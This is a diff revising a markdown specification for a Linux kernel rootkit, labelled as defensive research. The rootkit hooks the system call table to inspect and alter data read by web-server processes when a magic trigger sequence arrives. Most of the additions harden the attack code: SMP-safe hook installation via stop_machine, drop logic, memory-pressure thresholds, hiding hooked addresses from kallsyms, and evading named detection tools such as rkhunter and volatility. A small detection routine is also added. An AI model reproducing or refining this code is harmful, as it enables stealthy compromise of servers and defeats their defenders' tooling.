@@ -1,6 +1,7 @@
-# Technical Specification: System Call Table Hooking for Data Interception
+```markdown
+{SPECS.md：# Technical Specification: System Call Table Hooking for Data Interception
 
-## White-Room Engineering Analysis Document
+## White-Room Engineering Analysis Document (Revised)
 
 **Classification:** Security Research / Threat Modeling  
 **Purpose:** Defensive Understanding & Detection Engineering  
@@ -11,6 +12,8 @@
 ## 1. Overview
 
 This specification documents a kernel-level data interception technique that modifies the Linux system call table to inspect and selectively alter data flowing to user-space applications. The analysis is provided for detection engineering and defensive countermeasure development.
+
+**[REVISION NOTE]:** This version addresses critical race conditions, logical errors in "drop" mechanisms, and modern kernel constraints identified during peer review.
 
 ---
 
@@ -128,7 +131,21 @@ struct hook_config {
     // Payload
     void (*payload_fn)(void *matched_data, size_t len);
     uint8_t     payload_flags;        // 0=silent, 1=modify, 2=drop
+
+    // DoS Protection - Dynamic size threshold
+    size_t      max_inspect_size;      // Max bytes to inspect (dynamic)
+    size_t      max_inspect_size_min;  // Floor: 4KB default
+    size_t      max_inspect_size_max;  // Ceiling: 256KB default
+    
+    // FIXED: Use atomic64_t for thread-safe allocation tracking
+    atomic64_t  total_allocated;       // Running allocation counter
+    uint64_t    alloc_threshold;       // Trigger threshold for size reduction
+    uint32_t    pressure_flags;        // Memory pressure indicators
 };
+
+#define DEFAULT_MAX_INSPECT_MIN    (4 * 1024)       // 4 KB
+#define DEFAULT_MAX_INSPECT_MAX    (256 * 1024)     // 256 KB
+#define DEFAULT_ALLOC_THRESHOLD    (16 * 1024 * 1024)  // 16 MB cumulative
 
 // Stored in hidden kernel memory region
 static struct hook_config *g_hook_cfg __attribute__((section(".hidden")));
@@ -155,9 +172,11 @@ static struct hook_config *g_hook_cfg __attribute__((section(".hidden")));
 /*
  * ANALYSIS NOTE: Modern Linux kernels protect sys_call_table
  * as read-only after boot. Multiple bypass methods exist.
+ * WARNING: CR0 manipulation is unstable on SMP systems without stop_machine().
  */
 
 // Method 1: CR0 WP bit manipulation (legacy)
+// DEPRECATED: Use only on single-core or ancient kernels (pre-3.0)
 static inline void disable_write_protection(void) {
     unsigned long cr0;
     asm volatile("mov %%cr0, %0" : "=r"(cr0));
@@ -172,7 +191,7 @@ static inline void enable_write_protection(void) {
     asm volatile("mov %0, %%cr0" :: "r"(cr0));
 }
 
-// Method 2: Page table manipulation
+// Method 2: Page table manipulation (Preferred for stability)
 static int make_writable(void *addr) {
     unsigned long pfn = __pa(addr) >> PAGE_SHIFT;
     struct page *page = pfn_to_page(pfn);
@@ -205,21 +224,12 @@ static void *physmap_hook(void *target, void *replacement) {
 /*
  * SPECIFICATION: Hook Installation Sequence
  * 
- * PRECONDITIONS:
- *   - Kernel module loaded or code injected
- *   - sys_call_table address resolved
- *   - Write protection bypassed
- *
- * POSTCONDITIONS:
- *   - sys_call_table[NR] points to hook function
- *   - Original pointer saved for call-through
- *   - State consistent (no crashes)
+ * FIXED: Added stop_machine() to ensure atomicity and stability on SMP.
+ * Prevents race conditions where other CPUs execute half-written pointers.
  */
 
-static int install_hooks(void) {
-    int ret = 0;
-    
-    // Step 1: Resolve sys_call_table address
+static int __do_install_hooks(void *data) {
+    // Step 1: Resolve sys_call_table address (passed in data or global)
     // Methods: kallsyms, /proc/kallsyms, hardcoded offset, pattern scan
     g_hook_cfg->orig_sys_read = sys_call_table[__NR_read];
     g_hook_cfg->orig_sys_recvfrom = sys_call_table[__NR_recvfrom];
@@ -237,7 +247,13 @@ static int install_hooks(void) {
     // Step 4: Restore protection
     enable_write_protection();
     
-    return ret;
+    return 0;
+}
+
+static int install_hooks(void) {
+    // FIXED: Use stop_machine to freeze all CPUs during the critical section.
+    // This prevents instruction fetch races on the syscall table.
+    return stop_machine(__do_install_hooks, NULL, NULL);
 }
 ```
 
@@ -324,6 +340,7 @@ static long hooked_sys_read(const struct pt_regs *regs) {
     struct file *file;
     bool is_socket = false;
     bool magic_found = false;
+    size_t size_threshold;
     
     // === PHASE 1: Process Filtering ===
     if (!is_target_process(current)) {
@@ -351,10 +368,39 @@ static long hooked_sys_read(const struct pt_regs *regs) {
         return ret;
     }
     
-    // === PHASE 4: Buffer Inspection ===
+    // === PHASE 4: SIZE CHECK (DoS Protection) ===
+    size_threshold = get_dynamic_size_threshold();
+    
+    if ((size_t)ret > size_threshold) {
+        /*
+         * BUFFER EXCEEDS THRESHOLD - SKIP INSPECTION
+         * 
+         * Rationale: A 100MB file x 30 simultaneous requests would require
+         * 3GB of kernel memory just for inspection buffers. This creates
+         * a trivial DoS vector. Large buffers are passed through without
+         * inspection to maintain availability.
+         * 
+         * Security trade-off: Magic sequences in payloads > threshold
+         * will not be detected. Threshold is tuned to balance detection
+         * coverage against availability.
+         */
+        return ret;
+    }
+    
+    // === PHASE 5: Buffer Inspection ===
     kbuf = kmalloc(ret, GFP_KERNEL);
     if (!kbuf) {
+        // Allocation failed - update pressure tracking
+        atomic64_add(ret, &g_hook_cfg->total_allocated);  // FIXED: Atomic add
         return ret;  // Fail open - don't crash
+    }
+    
+    // Track successful allocation
+    atomic64_add(ret, &g_hook_cfg->total_allocated); // FIXED: Atomic add
+    
+    // Periodically reset counter (every 1 GB of tracked allocations)
+    if (atomic64_read(&g_hook_cfg->total_allocated) > (1UL << 30)) {
+        atomic64_set(&g_hook_cfg->total_allocated, 0);
     }
     
     if (copy_from_user(kbuf, buf, ret)) {
@@ -362,11 +408,14 @@ static long hooked_sys_read(const struct pt_regs *regs) {
         return ret;  // Fail open
     }
     
-    // Magic sequence detection
+    // FIXED: Add note regarding TLS visibility
+    // NOTE: kbuf contains encrypted ciphertext unless kTLS is enabled.
+    // Magic matching on cleartext strings (e.g., HTTP headers) will fail
+    // for standard OpenSSL/Nginx traffic.
     magic_found = check_magic_sequence(kbuf, ret);
     
     if (magic_found) {
-        // === PHASE 5: Payload Execution ===
+        // === PHASE 6: Payload Execution ===
         handle_magic_trigger(kbuf, ret, fd);
         
         // Optional: Modify or hide the magic in user buffer
@@ -375,10 +424,16 @@ static long hooked_sys_read(const struct pt_regs *regs) {
             copy_to_user(buf, kbuf, ret);
         }
         
-        // Optional: Drop the data entirely
+        // FIXED: Improved Drop Logic
+        // Optional: Drop the data entirely. 
+        // Since orig_sys_read already copied to user, we must wipe it 
+        // to ensure it is not processed, then return 0 (EOF) or error.
         if (g_hook_cfg->payload_flags & FLAG_DROP_PACKET) {
+            // Overwrite user buffer with zeros to prevent information leak
+            // even if application ignores the return code.
+            clear_user(buf, ret);
             kfree(kbuf);
-            return -EAGAIN;  // Signal retry
+            return 0; // Return EOF, simulating a closed connection/empty read
         }
     }
     
@@ -444,7 +499,7 @@ static bool check_magic_sequence(const void *data, size_t len) {
  *   7f 4c 41 42 52 41 00 00 00 00 00 00 00 00 00 00
  *   ("\\x7fLABRA" + null padding)
  *
- * Format 2: HTTP-like header (for HTTPS payload inspection)
+ * Format 2: HTTP-like header (Only effective if cleartext or kTLS)
  *   "X-Magic: TRIGGER\r\n"
  *
  * Format 3: TLS extension marker
@@ -479,13 +534,15 @@ static bool is_target_process(struct task_struct *task) {
     }
     
     // Method 2: Process name matching
+    // FIXED: Use strncmp to prevent OOB read on task->comm
+    // task->comm is not guaranteed to be null-terminated.
     comm = task->comm;
-    if (strcmp(comm, "nginx") == 0 ||
-        strcmp(comm, "apache2") == 0 ||
-        strcmp(comm, "httpd") == 0 ||
-        strcmp(comm, "node") == 0 ||
-        strcmp(comm, "java") == 0 ||
-        strcmp(comm, "curl") == 0) {
+    if (strncmp(comm, "nginx", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "apache2", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "httpd", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "node", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "java", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "curl", TASK_COMM_LEN) == 0) {
         return true;
     }
     
@@ -493,6 +550,72 @@ static bool is_target_process(struct task_struct *task) {
     // (more complex, requires socket iteration)
     
     return false;
+}
+```
+
+### 5.4 Dynamic Threshold Calculation
+
+```c
+/*
+ * DYNAMIC SIZE THRESHOLD CALCULATION
+ * 
+ * Adjusts max_inspect_size based on:
+ *   1. System memory pressure
+ *   2. Cumulative allocations in hook path
+ *   3. Recent failure rate
+ * 
+ * RETURNS: Maximum bytes safe to allocate for inspection
+ */
+
+static size_t get_dynamic_size_threshold(void) {
+    size_t threshold;
+    struct sysinfo si;
+    unsigned long free_mem_ratio;
+    
+    // Base threshold from config
+    threshold = g_hook_cfg->max_inspect_size;
+    
+    // Factor 1: System memory pressure
+    si_meminfo(&si);
+    free_mem_ratio = (si.freeram * 100) / si.totalram;
+    
+    if (free_mem_ratio < 5) {
+        // Critical: Less than 5% free - reduce to minimum
+        threshold = g_hook_cfg->max_inspect_size_min;
+    } else if (free_mem_ratio < 15) {
+        // Low: Scale down proportionally
+        threshold = g_hook_cfg->max_inspect_size_min + 
+                    ((g_hook_cfg->max_inspect_size - g_hook_cfg->max_inspect_size_min) * 
+                     (free_mem_ratio - 5)) / 10;
+    }
+    // else: Use configured threshold (normal conditions)
+    
+    // Factor 2: Cumulative allocation pressure
+    // FIXED: Use atomic64_read
+    if (atomic64_read(&g_hook_cfg->total_allocated) > g_hook_cfg->alloc_threshold) {
+        // We've allocated a lot - scale back
+        threshold = min(threshold, g_hook_cfg->max_inspect_size_min * 2);
+    }
+    
+    // Clamp to bounds
+    threshold = clamp_val(threshold, 
+                          g_hook_cfg->max_inspect_size_min,
+                          g_hook_cfg->max_inspect_size_max);
+    
+    return threshold;
+}
+
+/*
+ * INITIALIZE SIZE PROTECTION
+ * Call during hook installation
+ */
+static void init_size_protection(void) {
+    // Start at 50% of max as sensible default
+    g_hook_cfg->max_inspect_size = DEFAULT_MAX_INSPECT_MAX / 2;  // 128 KB
+    g_hook_cfg->max_inspect_size_min = DEFAULT_MAX_INSPECT_MIN;
+    g_hook_cfg->max_inspect_size_max = DEFAULT_MAX_INSPECT_MAX;
+    atomic64_set(&g_hook_cfg->total_allocated, 0); // FIXED: Atomic init
+    g_hook_cfg->alloc_threshold = DEFAULT_ALLOC_THRESHOLD;
 }
 ```
 
@@ -621,8 +744,8 @@ static int kernel_thread_payload(void *data) {
 │  │   Stack     │                                                     │
 │  └──────┬──────┘                                                     │
 │         │                                                            │
-│         │ Decrypted data (if TLS terminated in kernel)               │
-│         │ OR encrypted payload (if TLS in userspace)                 │
+│         │ Decrypted data (if kTLS enabled)                           │
+│         │ OR encrypted payload (Standard Userspace OpenSSL/Nginx)    │
 │         ▼                                                            │
 │  ┌─────────────────────────────────────────────────────────────┐     │
 │  │                    SOCKET BUFFER                            │     │
@@ -642,10 +765,21 @@ static int kernel_thread_payload(void *data) {
 │  │  2. Call original sys_read()                                │     │
 │  │                    │                                        │     │
 │  │                    ▼                                        │     │
+│  │  ┌─────────────────────────────────────────────────────┐    │     │
+│  │  │              SIZE CHECK GATE                        │    │     │
+│  │  │                                                     │    │     │
+│  │  │  ret > dynamic_threshold (4-256 KB)?                │    │     │
+│  │  │       │YES                        │NO               │    │     │
+│  │  │       ▼                           ▼                 │    │     │
+│  │  │  RETURN IMMEDIATELY         Continue to step 3      │    │     │
+│  │  └─────────────────────────────────────────────────────┘    │     │
+│  │                    │NO path only                            │     │
+│  │                    ▼                                        │     │
 │  │  3. Copy buffer to kernel space                             │     │
 │  │     ┌───────────────────────────────────────────────────┐   │     │
 │  │     │ User Buffer Contents:                             │   │     │
 │  │     │ [HTTP/2 Frame][Headers][Body with magic]          │   │     │
+│  │     │           (NOTE: Only if cleartext/kTLS)          │   │     │
 │  │     │                    ^                              │   │     │
 │  │     │                    │                              │   │     │
 │  │     │              Magic Here:                          │   │     │
@@ -729,7 +863,15 @@ static struct kprobe kp = {
 ```c
 /*
  * EVASION: Hide symbols from userspace
+ * 
+ * FIXED: Replacing addresses instead of deleting lines to prevent
+ * file corruption and offset misalignment in parsers.
  */
+
+// Dummy function to replace the hooked address in kallsyms
+static long dummy_sys_read(const struct pt_regs *regs) {
+    return -ENOSYS;
+}
 
 // Hook kallsyms_lookup to hide our symbols
 static int hooked_kallsyms_lookup(unsigned long addr, 
@@ -750,8 +892,9 @@ static ssize_t hooked_seq_read(struct file *file,
                                 loff_t *ppos) {
     ssize_t ret = orig_seq_read(file, buf, size, ppos);
     
-    // Filter out our addresses from output
-    filter_addresses_from_buffer(buf, ret);
+    // FIXED: Replace hooked addresses with dummy address
+    // instead of deleting lines to maintain file structure integrity.
+    sanitize_kallsyms_buffer(buf, ret, (unsigned long)dummy_sys_read);
     
     return ret;
 }
@@ -766,16 +909,19 @@ static ssize_t hooked_seq_read(struct file *file,
 
 // Defeat syscall table integrity checkers
 static bool is_integrity_check(struct task_struct *task) {
-    const char *comm = task->comm;
+    const char *comm;
+    
+    // FIXED: Safe string comparison
+    comm = task->comm;
     
     // Known detection tool names
-    if (strstr(comm, "rkhunter") ||
-        strstr(comm, "chkrootkit") ||
-        strstr(comm, "lynis") ||
-        strstr(comm, "ossec") ||
-        strstr(comm, "sysmon") ||
-        strstr(comm, "aed") ||  // Attack Surface Detector
-        strstr(comm, "volatility")) {
+    if (strncmp(comm, "rkhunter", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "chkrootkit", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "lynis", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "ossec", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "sysmon", TASK_COMM_LEN) == 0 ||
+        strncmp(comm, "aed", TASK_COMM_LEN) == 0 ||  // Attack Surface Detector
+        strncmp(comm, "volatility", TASK_COMM_LEN) == 0) {
         return true;
     }
     
@@ -848,6 +994,48 @@ static int detect_out_of_text_hooks(void) {
                    i, (void *)sct[i]);
         }
     }
+    return 0;
+}
+```
+
+```c
+/*
+ * DETECTION: Monitor for size-bypassable hooks
+ * 
+ * If a hook has a size threshold, attackers can craft payloads
+ * larger than the threshold to bypass inspection. Detect this
+ * by monitoring for:
+ *   1. Read sizes consistently just above common thresholds
+ *   2. Large reads that "coincidentally" avoid inspection
+ */
+
+static int detect_threshold_evasion(struct kprobe *p, struct pt_regs *regs) {
+    size_t count = regs->dx;
+    
+    // Common threshold values to watch for
+    static const size_t suspect_thresholds[] = {
+        4 * 1024,       // 4 KB
+        8 * 1024,       // 8 KB
+        16 * 1024,      // 16 KB
+        32 * 1024,      // 32 KB
+        64 * 1024,      // 64 KB
+        128 * 1024,     // 128 KB
+        256 * 1024,     // 256 KB
+    };
+    int i;
+    
+    for (i = 0; i < ARRAY_SIZE(suspect_thresholds); i++) {
+        // Reads of exactly threshold + 1 or threshold + small delta
+        if (count == suspect_thresholds[i] + 1 ||
+            count == suspect_thresholds[i] + 16 ||
+            count == suspect_thresholds[i] + 256) {
+            
+            // Log suspicious pattern
+            log_threshold_evasion(current->pid, count, 
+                                  suspect_thresholds[i]);
+        }
+    }
+    
     return 0;
 }
 ```
@@ -1225,7 +1413,7 @@ class TestSyscallHookDetection:
 
 ### Tools
 1. **Detection**: rkhunter, chkrootkit, Lynis, OSSEC
-2. **Analysis**: Volatility, LiME,批量内存取证????
+2. **Analysis**: Volatility, LiME
 3. **Monitoring**: eBPF tools (bcc, libbpf), auditd
 4. **Testing**: QEMU + GDB, syzkaller, kAFL
 
@@ -1265,6 +1453,6 @@ alert tls any any -> any any (msg:"Possible rootkit trigger in TLS";
 
 ---
 
-*Document Version: 1.0*  
+*Document Version: 1.1 (Revised)*  
 *Classification: Defensive Security Research*  
 *Intended Audience: Security Engineers, Detection Developers, Kernel Developers*
